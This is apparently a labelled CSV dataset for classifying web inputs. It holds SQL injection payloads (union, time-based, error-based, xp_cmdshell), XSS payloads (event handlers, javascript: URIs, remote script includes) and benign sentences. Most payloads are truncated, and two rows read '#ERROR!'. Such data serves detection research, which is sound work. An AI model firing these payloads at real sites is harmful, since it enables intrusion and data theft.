Payload,Label,text_label,ID
-2992' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( ,2,SQLi,21223
"-3250%"" union all select 7162,7162,7162,7162,7162,",2,SQLi,19456
1 and 7533 = 7533-- spzi,2,SQLi,17837
"-8414%"" ) union all select 2795#",2,SQLi,19107
select ( case when ( 2352 = 8672 ) then 2352 else ,2,SQLi,20462
1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ,2,SQLi,20868
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,10996
1 where 7055 = 7055,2,SQLi,22081
Dan Nathan is a seller of Financial Select Sector ,0,normal,26250
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,19817
"<style>@keyframes x{}</style><td style=""animation-",1,XSS,7115
"<main onmouseup=""alert(1)"">test</main>",1,XSS,2623
"1"" ) ) as hkrh where 3060 = 3060 or char ( 119 ) |",2,SQLi,13595
1 ) order by 1--,2,SQLi,20440
You can also select the same option the dropdown m,0,normal,25098
"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ",2,SQLi,12329
Select fire.,0,normal,24667
role,0,normal,23172
"-1148"" ) ) union all select 5442,5442,5442,5442#",2,SQLi,17637
1'+ ( select 'zjvx' where 4683 = 4683 and 6969 = (,2,SQLi,15178
order,0,normal,23121
<style>:target {color: red;}</style><figure id=x s,1,XSS,3998
"What, probably, will he spy?âwhat will he select t",0,normal,25161
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&,1,XSS,1695
"1%' ) ) or extractvalue ( 1297,concat ( 0x5c,0x717",2,SQLi,18083
"1"" ) rlike ( select ( case when ( 7689 = 7689 ) th",2,SQLi,20012
<title onpropertychange=javascript:alert(1)></titl,1,XSS,687
1'+ ( select 'hjku' where 1954 = 1954 and ( select,2,SQLi,17205
Select site.,0,normal,24547
0x77616974666F722064656C61792027303A303A313027 ...,2,SQLi,10125
"1 ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a",2,SQLi,12127
<head id=x tabindex=1 onactivate=alert(1)></head>,1,XSS,8419
"<iframe src=""""/srcdoc='&lt;svg onload&equals;alert",1,XSS,9731
select 'qqpjq'|| ( select ( case when ( 2933 = 293,2,SQLi,17182
Order a pepperoni pie.,0,normal,22713
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,18133
"<object classid=""clsid:..."" codebase=""javascript:d",1,XSS,1537
"<SCRIPT/SRC=""http://xss.rocks/xss.js""></SCRIPT>",1,XSS,262
<marquee onstart=alert(1)></marquee>,1,XSS,8223
"-2085"" ) as hkev where 7730 = 7730 union all selec",2,SQLi,14332
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6650
<input id=x onfocusin=alert(1)>,1,XSS,4682
"-4015"" where 2610 = 2610 or 1 group by concat ( 0x",2,SQLi,14189
Retrieve data where applicable.,0,normal,23344
"1' and ( select 9067 from ( select count ( * ) ,co",2,SQLi,21771
"Select "" Submit Payment request "" to send the requ",0,normal,25685
<s onpointerdown=alert(1)>XSS</s>,1,XSS,7362
"<figcaption onmouseup=""alert(1)"">test</figcaption>",1,XSS,3756
select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc,2,SQLi,16860
"-6279' ) union all select 3026,3026,3026,3026,3026",2,SQLi,14883
<svg><strong onload=alert(1)></strong>,1,XSS,2498
I'm planning to pick up some art supplies.,0,normal,23927
"1"" ) or 5286 = ( select count ( * ) from all_users",2,SQLi,15804
1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ,2,SQLi,20944
"<acronym draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,3839
Where's the therapy session?,0,normal,23660
Silk scarves and suit covers are a select part of ,0,normal,25552
"<img src=# onerror\x3D""javascript:alert(1)"" >",1,XSS,617
<menuitem id=x tabindex=1 onfocus=alert(1)></menui,1,XSS,6261
select * from users where id = 1. union select nul,2,SQLi,11611
"<label onmouseout=""alert(1)"">test</label>",1,XSS,2649
#ERROR!,2,SQLi,10952
-2364' or 6743 = 7578,2,SQLi,21792
1 ) as estm where 4809 = 4809 union all select nul,2,SQLi,12828
"1"" ) ) as turj where 1237 = 1237",2,SQLi,21563
<img onpointermove=alert(1)>XSS</img>,1,XSS,6738
"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>",1,XSS,5218
1 ) ) as qzmg where 4344 = 4344 procedure analyse ,2,SQLi,22047
"Hit ""Story Settings,"" click ""Hide My Story From"" a",0,normal,26094
"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",2,SQLi,12527
Home Depot: Up to 50% off select patio furniture; ,0,normal,26090
"<multicol onmouseenter=""alert(1)"">test</multicol>",1,XSS,8713
-9875' ) or ( 8459 = 8459 ) *4906 and ( 'mrxw' = ',2,SQLi,22310
Select the best camera settings for the shot.,0,normal,24104
She deleted the old files.,0,normal,22993
"<col draggable=""true"" ondragend=""alert(1)"">test</c",1,XSS,3906
"<li draggable=""true"" ondragleave=""alert(1)"">test</",1,XSS,3216
"<p onbeforepaste=""alert(1)"" contenteditable>test</",1,XSS,8676
"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,",2,SQLi,20403
1' ) ) ) and 3580 = ( select count ( * ) from doma,2,SQLi,19724
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10793
<script>d.innerHTML+='';</script>,1,XSS,9290
<progress onpointerout=alert(1)>XSS</progress>,1,XSS,6793
"{""id"":null,""firstName"":""Kenneth"",""lastName"":""Chia""",0,normal,27464
1%' ) and exp ( ~ ( select * from ( select concat ,2,SQLi,20960
"1"" ) ) or row ( 1045,7562 ) > ( select count ( * )",2,SQLi,21115
"<aside onclick=""alert(1)"">test</aside>",1,XSS,6781
"<style>@keyframes x{}</style><spacer style=""animat",1,XSS,2712
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--",2,SQLi,10780
"<style>@keyframes x{}</style><code style=""animatio",1,XSS,4441
1' and 6414 = ( select count ( * ) from rdb$fields,2,SQLi,21685
Select bonus categories â Many other cash-back car,0,normal,25643
1' ) ) as tfub where 3461 = 3461 or 7427 = dbms_pi,2,SQLi,14366
"<dl oncut=""alert(1)"" contenteditable>test</dl>",1,XSS,5239
"-5528' ) union all select 5153,5153,5153,5153,5153",2,SQLi,14720
<section onpointerover=alert(1)>XSS</section>,1,XSS,7709
"<iframe src=""javascript:alert('XSS by \nxss');""></",1,XSS,1351
-9734' ) ) as izbx where 6273 = 6273 union all sel,2,SQLi,14977
Transplant strong plants of biennials and perennia,0,normal,25235
select ( case when ( 5752 = 6036 ) then 1 else 575,2,SQLi,15244
"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http:/",1,XSS,9141
"<noembed oncontextmenu=""alert(1)"">test</noembed>",1,XSS,7224
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5787
"<a draggable=""true"" ondragend=""alert(1)"">test</a>",1,XSS,5746
Select breakfast.,0,normal,24500
"<tt oncontextmenu=""alert(1)"">test</tt>",1,XSS,3788
"<div style=""width: expression(document.vulnerable=",1,XSS,1536
"<main draggable=""true"" ondrag=""alert(1)"">test</mai",1,XSS,4244
"{""id"":null,""firstName"":""Wei Hong"",""lastName"":""Quek",0,normal,27415
"1%"" ) ) ) and 9198 = 9198--",2,SQLi,16365
"1%' ) ) ) union all select null,null,null,null,nul",2,SQLi,22076
"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then ",2,SQLi,12571
Join tables where valid.,0,normal,23338
-4136' ) ) as cczp where 7052 = 7052 union all sel,2,SQLi,15761
Where's the bike path?,0,normal,23596
"1"" union all select null,null,null,null,null,null#",2,SQLi,18345
end and ( ( 'zeyr' = 'zeyr,2,SQLi,18601
">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26",1,XSS,1690
"Just open Health, and select ""browse"" in the lower",0,normal,25930
Where's the ophthalmologist?,0,normal,23629
"1' ) ) ) union all select null,null,null#",2,SQLi,14152
"-3885 ) where 2387 = 2387 union all select 2387,23",2,SQLi,13274
Delete tweet.,0,normal,23082
<rp onpointerleave=alert(1)>XSS</rp>,1,XSS,4248
select ( case when ( 8208 = 7960 ) then 8208 else ,2,SQLi,19708
"1"" ) as ranl where 5553 = 5553",2,SQLi,20620
"<rt onmouseenter=""alert(1)"">test</rt>",1,XSS,5773
<STYLE>@import'http://.rocks/.css';</STYLE>,1,XSS,7875
Where's the train station?,0,normal,23501
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,17159
1 ) as bzuh where 8041 = 8041 and 6307 = 9200#,2,SQLi,18321
<font id=x tabindex=1 onfocus=alert(1)></font>,1,XSS,3880
Select location.,0,normal,24545
<strong onpointerenter=alert(1)>XSS</strong>,1,XSS,6237
1%' ) ) or exp ( ~ ( select * from ( select concat,2,SQLi,12550
1' ) where 5331 = 5331,2,SQLi,19829
"<spacer onbeforepaste=""alert(1)"" contenteditable>t",1,XSS,2872
--><!-- --\x00> <img src=xxx:x onerror=javascript:,1,XSS,423
<tfoot id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,5504
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,18797
"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ",2,SQLi,22448
"{""id"":null,""name"":""sentence""}",0,normal,26997
"1%' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr",2,SQLi,17484
"1%"" ) ) or updatexml ( 1808,concat ( 0x2e,0x717170",2,SQLi,14626
"Choose, then select.",0,normal,24458
"<a onmousemove=""alert(1)"">test</a>",1,XSS,4350
"1, ( select ( case when ( 9443 = 9443 ) then sleep",2,SQLi,20456
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,21104
"1"" ) ) union all select null,null,null,null,null,n",2,SQLi,17902
( select ( case when ( 5792 = 5792 ) then 5792 els,2,SQLi,17059
count,0,normal,23140
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,21394
"{""id"":null,""name"":""cent""}",0,normal,27560
"1"" where 2221 = 2221 and 5318 = 8398--",2,SQLi,16406
"Tap the ""SELECT MULTIPLE"" button with the overlapp",0,normal,25503
"1%"" or extractvalue ( 1297,concat ( 0x5c,0x7171706",2,SQLi,21858
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE,1,XSS,1432
"1"" ) as wxea where 6394 = 6394 procedure analyse (",2,SQLi,13958
"That way, you can select a studio that is quiet an",0,normal,25490
"1"" ) ) as hzcq where 9250 = 9250 and 4386 = utl_in",2,SQLi,19476
"1"" where 7344 = 7344 rlike ( select * from ( selec",2,SQLi,22432
"1"" ) ) and 7533 = 7533 and ( ( ""gkca"" = ""gkca",2,SQLi,22120
Plant a lush garden.,0,normal,22662
1' ) where 3330 = 3330 and 6414 = ( select count (,2,SQLi,21713
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:ale,1,XSS,1379
"<dl onmouseenter=""alert(1)"">test</dl>",1,XSS,3214
1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ,2,SQLi,14334
1 where 6523 = 6523 and 8594 = ( select 8594 from ,2,SQLi,16243
Likely: 20 percent â 40 percent off select styles;,0,normal,25906
"<style>:target {color:red;}</style><u id=x style=""",1,XSS,2041
"1"" ) ) as lslk where 6729 = 6729 and char ( 111 ) ",2,SQLi,20752
""" ) ;waitfor delay '0:0:__TIME__'--",2,SQLi,11503
"1"" ) as qayu where 6222 = 6222 union all select nu",2,SQLi,14006
1' ) ) as efmy where 7299 = 7299 and 8635 = ( sele,2,SQLi,20231
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20",2,SQLi,10883
Select your swap.,0,normal,25049
"<var oncopy=""alert(1)"" contenteditable>test</var>",1,XSS,6056
Select repair.,0,normal,24615
"-9634' ) ) ) union all select 4141,4141#",2,SQLi,18487
Select your muse.,0,normal,24976
<colgroup onpointerover=alert(1)>XSS</colgroup>,1,XSS,2083
"<figure onpaste=""alert(1)"" contenteditable>test</f",1,XSS,3192
Merge the customer records.,0,normal,22693
<x/onxxx=1,1,XSS,9365
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",2,SQLi,10865
Head Full of Honey is in select theaters Nov. 30.,0,normal,26107
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&a,1,XSS,1431
1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,2,SQLi,19380
<textarea onpointermove=alert(1)>XSS</textarea>,1,XSS,1835
"1"" ) where 2570 = 2570 and 3707 = ( select count (",2,SQLi,19129
"1"" ) where 9855 = 9855",2,SQLi,18690
Select search.,0,normal,24595
"javascript:alert()//""/*`/*'/*\""/*--></title></text",1,XSS,9517
javascript:alert();//</title></noscript></noembed>,1,XSS,9532
"select count ( * ) from domain.domains as t1,domai",2,SQLi,19545
"<acronym onkeyup=""alert(1)"" contenteditable>test</",1,XSS,7107
"1%' ) union all select null,null,null,null,null--",2,SQLi,22099
"{""id"":null,""firstName"":""Betty"",""lastName"":""Goh"",""a",0,normal,27377
Where should we meet for our meeting?,0,normal,22902
1' ) where 7391 = 7391 or ( select 9173 from ( sel,2,SQLi,18625
"<spacer draggable=""true"" ondragend=""alert(1)"">test",1,XSS,5550
") AND ELT(1337=1337,SLEEP(5)) AND (1337=1337",2,SQLi,11254
<slot id=x tabindex=1 ondeactivate=alert(1)></slot,1,XSS,1945
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a474",2,SQLi,18409
"1' ) union all select null,null,null,null,null,nul",2,SQLi,15261
1 and exp ( ~ ( select * from ( select concat ( 0x,2,SQLi,20460
1' where 1602 = 1602 or ( select 2* ( if ( ( selec,2,SQLi,17885
"<strong onmouseenter=""alert(1)"">test</strong>",1,XSS,6054
<style>:target {transform: rotate(180deg);}</style,1,XSS,5711
1'|| ( select 'zrea' from dual where 1223 = 1223 o,2,SQLi,21323
<style>:target {color:red;}</style><output id=x st,1,XSS,5440
"1 ) and make_set ( 4593 = 7765,7765 ) and ( 8517 =",2,SQLi,12537
<abbr onpointerover=alert(1)>XSS</abbr>,1,XSS,2186
1 ) where 8734 = 8734 procedure analyse ( extractv,2,SQLi,16324
1' where 5230 = 5230,2,SQLi,16929
Select conceal.,0,normal,24687
1' ) as twny where 9580 = 9580,2,SQLi,13613
"1 ) ) ) union all select null,null,null,null,null,",2,SQLi,12623
Samsung EVO Select 256GB MicroSDXC U3 Memory Card ,0,normal,25735
"<dfn onmouseover=""alert(1)"">test</dfn>",1,XSS,7519
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112",2,SQLi,16799
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,12312
"-4355"" ) ) ) or 9323 = 9323#",2,SQLi,14533
<input oninput=alert(1) value=xss>,1,XSS,70
Save up to 30% off select Men's Skincare & Groomin,0,normal,25720
1'+ ( select 'uetb' where 6468 = 6468,2,SQLi,21069
&#x0003c,1,XSS,1073
select,0,normal,25689
1%' or 5286 = ( select count ( * ) from all_users ,2,SQLi,14111
Select wilt.,0,normal,24676
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,16455
"-2225' union all select 1545,1545,1545,1545#",2,SQLi,13040
"<nobr onmouseover=""alert(1)"">test</nobr>",1,XSS,4897
1' ) as khaa where 8157 = 8157 and 2388 = benchmar,2,SQLi,17137
Select your ideal location.,0,normal,24473
"<center onmouseout=""alert(1)"">test</center>",1,XSS,2704
<label onpointerup=alert(1)>XSS</label>,1,XSS,6341
1,0,normal,26715
1' or 7427 = dbms_pipe.receive_message ( chr ( 116,2,SQLi,17588
<frame onfocusout=alert(1) tabindex=1 id=x></frame,1,XSS,3102
"<thead ondblclick=""alert(1)"">test</thead>",1,XSS,4424
"<style>@keyframes slidein {}</style><dd style=""ani",1,XSS,2452
"<style>@keyframes x{}</style><slot style=""animatio",1,XSS,3489
"<frameset ondblclick=""alert(1)"">test</frameset>",1,XSS,5514
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0; URL=htt",1,XSS,1606
select ( case when ( 6804 = 7050 ) then 6804 else ,2,SQLi,19788
1%' ) ) ) or 5356 = ( select count ( * ) from sysu,2,SQLi,22140
1 ) ) ) and 8990 = 4775 and ( ( ( 1894 = 1894,2,SQLi,18009
1 ) as cwsi where 7360 = 7360 or sleep ( 5 ) #,2,SQLi,12799
"1"" where 4213 = 4213 and 8407 = ( select count ( *",2,SQLi,16513
I need to select the best photo for the album.,0,normal,23771
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",2,SQLi,10750
"<audio oncontextmenu=""alert(1)"">test</audio>",1,XSS,1839
"-1681%"" union all select 8180,8180,8180,8180,8180,",2,SQLi,12508
"<a href=""javascript\x09:javascript:alert(1)"" id=""f",1,XSS,543
1 ) ) ) or exp ( ~ ( select * from ( select concat,2,SQLi,13201
"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",1,XSS,2716
1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ),2,SQLi,17888
<nav id=x tabindex=1 onactivate=alert(1)></nav>,1,XSS,3873
<style>:target {color: red;}</style><h1 id=x style,1,XSS,2844
"-4166%"" ) union all select 5190--",2,SQLi,14115
-1641'|| ( select 'jfnu' where 7682 = 7682 union a,2,SQLi,13255
I'll select my tie.,0,normal,24332
<textarea onpointerup=alert(1)>XSS</textarea>,1,XSS,8033
Update your profile picture with the new one.,0,normal,22930
"1"" ) as mibc where 3113 = 3113",2,SQLi,13991
<source onpointerover=alert(1)>XSS</source>,1,XSS,8397
"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x71717",2,SQLi,12639
"<dialog onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,4478
"1"" where 9792 = 9792 rlike ( select * from ( selec",2,SQLi,20660
1'+ ( select mcfb where 4050 = 4050 or 9643 = ( se,2,SQLi,18425
"<summary onclick=""alert(1)"">test</summary>",1,XSS,3806
-2316' ) ) ) or 8519 = 6010,2,SQLi,17041
<style>:target {transform: rotate(180deg);}</style,1,XSS,6176
"1' ) procedure analyse ( extractvalue ( 5840,conca",2,SQLi,19082
select * from users where id = 1 +$ 1 or 1 = 1 -- ,2,SQLi,11468
#ERROR!,2,SQLi,22541
"<script ="">"" SRC=""http://www.securitycompass.com/x",1,XSS,1556
"1"" ) ) ) or 2367 = ( select count ( * ) from rdb$f",2,SQLi,14967
"<strong draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,2111
"<meta http-equiv=""Content-Type"" content=""text/html",1,XSS,178
He picked a beautiful flower from the garden.,0,normal,23828
1%' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 1,2,SQLi,17564
( select ( case when ( 9856 = 9856 ) then sleep ( ,2,SQLi,12845
%' AND 8310=8310 AND '%'=',2,SQLi,10340
"union ( select NULL, ( select @@version ) ) --",2,SQLi,11803
select * from users where id = 1 union select @ $_,2,SQLi,11433
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,1861
"<option onpaste=""alert(1)"" contenteditable>test</o",1,XSS,3308
trim,0,normal,23192
Find data where applicable.,0,normal,23355
You can also select an option which reflects your ,0,normal,25101
"{""id"":null,""name"":""stronger""}",0,normal,27063
1' ) where 7908 = 7908 or sleep ( 5 ) --,2,SQLi,12640
<svg><rtc onload=alert(1)></rtc>,1,XSS,2556
"<basefont onclick=""alert(1)"">test</basefont>",1,XSS,6937
1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),2,SQLi,21187
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) |",2,SQLi,14760
<w contenteditable id=x onfocus=alert()>,1,XSS,1165
1' ) ) as uvxv where 6663 = 6663 and 8514 = ( sele,2,SQLi,19842
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%',2,SQLi,10373
"<meta oncontextmenu=""alert(1)"">test</meta>",1,XSS,6917
"Open the ""Settings"" menu on your PS4 and select ""D",0,normal,25814
-6680' ) or 5483 = 3031 and ( 'zxes' = 'zxes,2,SQLi,17846
"<blink onmousemove=""alert(1)"">test</blink>",1,XSS,7756
"1 ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 46",2,SQLi,20394
"-9629' ) ) ) union all select 3077,3077,3077,3077#",2,SQLi,20697
"1"" where 6352 = 6352",2,SQLi,20213
"1"" ) as yecj where 1194 = 1194 and 8407 = ( select",2,SQLi,13693
<button id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,5056
select * from users where id = 1 + ( 1 ) or 1 = 1 ,2,SQLi,11638
Select train.,0,normal,24713
1 ) ) as cwyb where 3633 = 3633,2,SQLi,15491
"-7884"" where 3297 = 3297 or 2492 = 6158",2,SQLi,12742
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4847
"<wbr onmouseenter=""alert(1)"">test</wbr>",1,XSS,6039
"<a onkeyup=""alert(1)"" contenteditable>test</a>",1,XSS,3287
<vmlframe xmlns=urn:schemas-microsoft-com:vml styl,1,XSS,721
1' where 4460 = 4460,2,SQLi,13188
"{""id"":null,""name"":""salt""}",0,normal,27180
<strike onpointerup=alert(1)>XSS</strike>,1,XSS,8054
"<img src=x onerror=\x09""javascript:alert(1)"">",1,XSS,678
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&qu,1,XSS,1424
"1"" ) ) as tjdz where 8656 = 8656 union all select ",2,SQLi,15755
atan,0,normal,23218
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",1,XSS,4980
-2929' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5,2,SQLi,19374
"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( (",2,SQLi,21879
-7175' or 4493 = utl_inaddr.get_host_address ( chr,2,SQLi,13792
<iframe onpointerdown=alert(1)>XSS</iframe>,1,XSS,4299
"1"" where 5216 = 5216 or 5286 = ( select count ( * ",2,SQLi,19908
"<noscript onclick=""alert(1)"">test</noscript>",1,XSS,8873
1' rlike sleep ( 5 ) and 'cugs' = 'cugs,2,SQLi,13537
"<i onbeforecut=""alert(1)"" contenteditable>test</i>",1,XSS,7837
1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ch,2,SQLi,16269
"1%"" ) ) union all select null,null,null,null,null,",2,SQLi,13610
1,0,normal,26719
1 ) ) ) rlike ( select * from ( select ( sleep ( 5,2,SQLi,22088
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,21040
1 ) ) or sleep ( 5 ) #,2,SQLi,12132
<a onmouseover=alert(document.cookie)\>xxs link\</,1,XSS,3017
"1"" ) where 5196 = 5196 and 6055 = ctxsys.drithsx.s",2,SQLi,20615
"<xss draggable=""true"" ondragenter=""alert(1)"" style",1,XSS,63
-7199'|| ( select 'ssty' where 5406 = 5406 order b,2,SQLi,12535
"<label onbeforecopy=""alert(1)"" contenteditable>tes",1,XSS,2353
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&a,1,XSS,1373
"hi"""") or (""""a""""=""""a""",2,SQLi,10065
<style>:target {color: red;}</style><script id=x s,1,XSS,6167
<style id=x tabindex=1 onbeforedeactivate=alert(1),1,XSS,4076
"{""id"":null,""firstName"":""Jaylen"",""lastName"":""Chuan""",0,normal,27345
select ( case when ( 3565 = 4053 ) then 3565 else ,2,SQLi,20735
"<pre onmouseleave=""alert(1)"">test</pre>",1,XSS,1993
1 ) as cjmt where 4839 = 4839 procedure analyse ( ,2,SQLi,17667
1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 1,2,SQLi,16057
"<input type=""text"" value=``<div/onmouseover='alert",1,XSS,9220
""")) and 0=benchmark(3000000,MD5(1))%20/*",2,SQLi,11043
select ( case when ( 1724 = 6528 ) then 1724 else ,2,SQLi,15025
<input id=x tabindex=1 onactivate=alert(1)></input,1,XSS,1866
1' and ( select * from ( select ( sleep ( 5 ) ) ) ,2,SQLi,18207
"1%"" ) ) ) ( select ( case when ( 5451 = 5451 ) the",2,SQLi,16034
<style>:target {transform: rotate(180deg);}</style,1,XSS,5224
1'|| ( select 'svnn' from dual where 8710 = 8710,2,SQLi,22031
<p onpointerup=alert(1)>XSS</p>,1,XSS,5480
"1"" and 6510 = ( select count ( * ) from sysusers a",2,SQLi,18047
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,1,XSS,1086
"<wbr draggable=""true"" ondragend=""alert(1)"">test</w",1,XSS,6907
1 ) rlike ( select ( case when ( 8488 = 1270 ) the,2,SQLi,12683
"{""id"":null,""firstName"":""Debbie"",""lastName"":""Erqie""",0,normal,27513
"1%"" ) and 8312 = dbms_pipe.receive_message ( chr (",2,SQLi,14579
1,0,normal,26683
"1' ) ) ) union all select null,null,null,null--",2,SQLi,15279
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) |",2,SQLi,14465
"1 union all select null,null,null,null,null,null--",2,SQLi,14495
<a href=javas&#99;ript:alert(1)>click,1,XSS,9571
"1%"" ) and make_set ( 8403 = 8403,8899 ) and ( ""%"" ",2,SQLi,16275
"*/alert(1)"">'onload=""/*<svg/1='",1,XSS,9006
1 ) or 5356 = ( select count ( * ) from sysusers a,2,SQLi,15500
"1%"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ",2,SQLi,18368
1 ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( (,2,SQLi,19196
"1' ) union all select null,null,null,null,null,nul",2,SQLi,18276
"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 11",2,SQLi,18128
"<legend onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,5142
select ( case when ( 4297 = 9086 ) then 4297 else ,2,SQLi,21014
1' ) ) ) and 7533 = 7533 and ( ( ( 'txex' = 'txex,2,SQLi,20653
Select rise.,0,normal,24673
and WAITFOR DELAY '0:0:5',2,SQLi,11316
<output onfocusout=alert(1) tabindex=1 id=x></outp,1,XSS,6402
<kbd onpointermove=alert(1)>XSS</kbd>,1,XSS,4294
"<bdo draggable=""true"" ondragend=""alert(1)"">test</b",1,XSS,7306
"{""id"":null,""name"":""Aardvark""}",0,normal,27130
She has also coached national select teams for U.S,0,normal,25557
"<main draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,3305
"javascript:/*""/*`/*'/*\""/*-->*/ alert()//</title><",1,XSS,9515
"<video onbeforecut=""alert(1)"" contenteditable>test",1,XSS,7722
1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'zhhf' li,2,SQLi,21823
<input onblur=alert(1) id=x><input autofocus>,1,XSS,7379
"-2365 ) ) union all select 8190,8190#",2,SQLi,22090
"-4135"" ) as leiz where 3582 = 3582 or 4144 = ( sel",2,SQLi,19828
Can you help me decide where to take a weekend tri,0,normal,23953
"<li draggable=""true"" ondragstart=""alert(1)"">test</",1,XSS,7141
1'|| ( select 'qrle' from dual where 9239 = 9239 o,2,SQLi,19233
exec master..xp_cmdshell 'ipconfig+/all',2,SQLi,10033
<tfoot onpointerleave=alert(1)>XSS</tfoot>,1,XSS,5221
1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ,2,SQLi,18583
"<style>@keyframes x{}</style><param style=""animati",1,XSS,5368
-2174' ) ) or 5903 = ( 'qqpjq'|| ( select case 590,2,SQLi,18404
"1"" ) ) as mvxa where 3024 = 3024",2,SQLi,12431
-7797'+ ( select oulr where 7091 = 7091 union all ,2,SQLi,14727
"<listing oncontextmenu=""alert(1)"">test</listing>",1,XSS,5896
1 ) as pqle where 4039 = 4039 and 7533 = 7533--,2,SQLi,17553
"-3979' in boolean mode ) union all select 4911,491",2,SQLi,18243
1 ) ) or ( select 2* ( if ( ( select * from ( sele,2,SQLi,19263
"<style>@keyframes x{}</style><s style=""animation-n",1,XSS,2647
